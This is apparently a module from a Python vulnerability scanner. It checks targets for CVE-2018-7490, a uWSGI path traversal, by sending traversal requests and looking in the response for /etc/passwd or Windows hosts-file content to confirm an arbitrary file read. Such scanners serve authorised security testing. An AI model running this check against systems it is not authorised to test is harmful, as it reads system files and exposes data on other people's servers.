#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.logger import logger
from lib.tool import check
from thirdparty import requests
from thirdparty import HackRequests
from time import sleep
import re

def cve_2018_7490_scan(self, url):
    ''' uWSGI 2.0.17之前的PHP插件
            没有正确的处理DOCUMENT_ROOT检测
            导致用户可以通过..%2f来跨越目录, 读取或运行DOCUMENT_ROOT目录以外的文件
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'FileRead'
    vul_info['vul_id'] = 'CVE-2018-7490'
    # vul_info['vul_method'] = 'GET'
    vul_info['headers'] = {}

    headers = self.headers.copy()
    headers.update(vul_info['headers'])

    for payload in self.cve_2018_7490_payloads:
        path = payload['path']
        data = payload['data']
        target = url + path

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            res = requests.get(
                target, 
                timeout=self.timeout, 
                headers=headers,
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG


            # todo 判断
            if (re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res.text, re.I|re.M|re.S)
                or (('Microsoft Corp' in res.text) 
                    and ('Microsoft TCP/IP for Windows' in res.text))):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
